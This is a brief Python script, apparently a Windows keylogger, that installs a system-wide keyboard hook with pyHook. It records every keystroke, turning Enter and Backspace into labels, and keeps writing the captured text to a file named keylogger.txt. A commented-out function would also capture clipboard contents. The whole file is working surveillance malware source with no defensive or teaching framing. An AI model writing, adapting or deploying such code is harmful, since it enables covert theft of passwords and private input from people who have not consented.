import pythoncom, pyHook, pyperclip, time

def keypressed(event):
	global store
	if event.Ascii==13:
		keys = '< Enter >'
	elif event.Ascii == 8:
		keys = '<BACK SPACE>'
	else:
		keys = chr(event.Ascii)
	store = store + keys
	fp = open("keylogger.txt","w")
	fp.write(store)
	fp.close()
	return True

# def clipboard(event):
# 	pasted = []
# 	if pyperclip.paste() != 'None':
# 		value = pyperclip.paste()

# 		if value not in pasted:
# 			pasted.append(value)
# 			fp = open("keylogger.txt","w")
# 			fp.write(value)
# 			fp.close()
# 			time.sleep(3)

store = ''
obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()